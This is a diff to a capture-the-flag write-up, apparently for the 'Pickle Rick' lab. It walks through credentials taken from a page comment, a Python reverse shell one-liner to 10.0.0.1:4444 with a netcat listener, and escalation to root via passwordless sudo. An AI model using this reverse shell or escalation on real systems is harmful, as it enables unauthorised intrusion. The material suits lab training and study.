@@ -84,8 +84,94 @@ When i was looking at Request i found comment with user
 <img width="1871" height="557" alt="image" src="https://github.com/user-attachments/assets/f1962e1a-91ac-44bb-ae93-d6b6ab2f74e4" />
 
 So we can try to login in this credencials we got
+
 Login: R1ckRul3s
+
 Passowrd: Wubbalubbadubdub
 
-And there is a panel 
+**And there is a panel **
+
 <img width="2099" height="955" alt="image" src="https://github.com/user-attachments/assets/116e7de5-bab7-4fe4-b175-c16852d8c035" />
+
+
+when we in, we can find basic console we cant use there cat or other more specific command, 
+
+but while searching i found there is python3
+
+with use i generate a RCE payload 
+https://www.revshells.com/
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
+
+and like that we got in (I used https://0xffsec.com/handbook/shells/full-tty/ to upgrade shell to bash)
+```
+[ Oguri ~/Desktop ]$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.81.161.175 37856
+$ ^Z
+[1]+  Stopped                    nc -lvnp 4444
+[ Oguri ~/Desktop ]$ stty raw -echo && fg
+nc -lvnp 4444
+
+$ 
+$ ls
+Sup3rS3cretPickl3Ingred.txt  clue.txt	 index.html  portal.php
+assets			     denied.php  login.php   robots.txt
+```
+
+The is 2 good looking files for us
+
+**Sup3rS3cretPickl3Ingred.txt**
+
+First flag: X
+
+**clue.txt**
+
+"Look around the file system for the other ingredient."
+
+### Secound Flag
+
+So we got a clue "Look around the file system for the other ingredient." good idea is to start at /home
+```
+www-data@ip-10-81-161-175:/usr/share$ cd /home
+www-data@ip-10-81-161-175:/home$ ls
+rick  ubuntu
+www-data@ip-10-81-161-175:/home$ cd ./rick
+www-data@ip-10-81-161-175:/home/rick$ ls -la
+total 12
+drwxrwxrwx 2 root root 4096 Feb 10  2019  .
+drwxr-xr-x 4 root root 4096 Feb 10  2019  ..
+-rwxrwxrwx 1 root root   13 Feb 10  2019 'second ingredients'
+www-data@ip-10-81-161-175:/home/rick$ cat 'second ingredients' 
+Cool flag here
+```
+
+### Third Flag
+
+Usually the last flag is connected to **root** and here it is exactly like this.
+
+with sudo -l we can check
+(-l option to list a user's privileges for the remote host.)
+
+And this is:
+(ALL) NOPASSWD: ALL
+
+That mean users or groups are able to run sudo without authenticating.
+
+```
+www-data@ip-10-81-161-175:/$ sudo -l
+Matching Defaults entries for www-data on ip-10-81-161-175:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-81-161-175:
+    (ALL) NOPASSWD: ALL
+www-data@ip-10-81-161-175:/$ sudo su
+root@ip-10-81-161-175:/# / cd /root
+root@ip-10-81-161-175:~# ls
+3rd.txt  snap
+root@ip-10-81-161-175:~# cat 3rd.txt 
+3rd ingredients: Last flag here
+```
